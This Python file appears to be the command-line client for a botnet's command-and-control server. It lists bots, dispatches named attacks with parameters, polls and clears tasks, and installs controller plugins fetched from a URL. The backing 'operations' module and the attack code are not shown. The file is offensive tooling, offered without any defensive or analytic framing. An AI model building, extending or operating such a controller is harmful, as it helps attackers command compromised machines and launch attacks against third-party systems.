#!/usr/bin/env python

import json
import time
import operations


# $host $port bot_list ($time)
def knight_ls(context):
    if len(context['args']) == 1: context['param'] = context['args'][0]
    return operations.print_list(json.loads(operations.request(context)))
    #return operations.bot_ls(json.loads(operations.request(context)))


# $host $port task_run $attack [$parameters]
def task_run(context):
    if len(context['args']) == 0: return "Invalid parameters"
    if len(context['args']) > 0:
        context['json'] = {'command': context['args'][0], 'parameters': operations.hash_args(context['args'][1:])}
        context['headers'] = {'content-type': 'application/json'}
        return json.dumps(json.loads(operations.request(context)), indent=2)


# $host $port task_list
def task_ls(context):
    return json.dumps(json.loads(operations.request(context)), indent=2)


# $host $port task_check $id
def task_check(context):
    if len(context['args']) == 0: return "Invalid parameters"
    while True:
        result = json.loads(operations.parameter(context))
        if not (len(context['args']) > 1 and context['args'][1] == 'block' and result['complete'] != True): break
        time.sleep(10)
    return json.dumps(result, indent=2)


# $host $port task_output $id
def task_output(context):
    if len(context['args']) == 0: return "Invalid parameters"
    return json.dumps(json.loads(operations.parameter(context)), indent=2)


# $host $port task_clear $id
def task_rm(context):
    if len(context['args']) == 0: return "Invalid parameters"
    return json.dumps(json.loads(operations.parameter(context)), indent=2)


# $host $port plugin_install $url
def plugin_install(context):
    if len(context['args']) == 0: return "Invalid parameters"
    if len(context['args']) == 1: context['data'] = context['args'][0]
    return json.dumps(json.loads(operations.request(context))['response'], indent=2)


# $host $port plugin_list
def plugin_ls(context):
    return json.dumps(json.loads(operations.request(context)), indent=2)


# $host $port plugin_clear $id
def plugin_rm(context):
    if len(context['args']) == 0: return "Invalid parameters"
    return json.dumps(json.loads(operations.parameter(context)), indent=2)


# $host $port plugin_help $id
def plugin_help(context):
    if len(context['args']) == 0: return "Invalid parameters"
    return json.dumps(json.loads(operations.parameter(context)), indent=2)
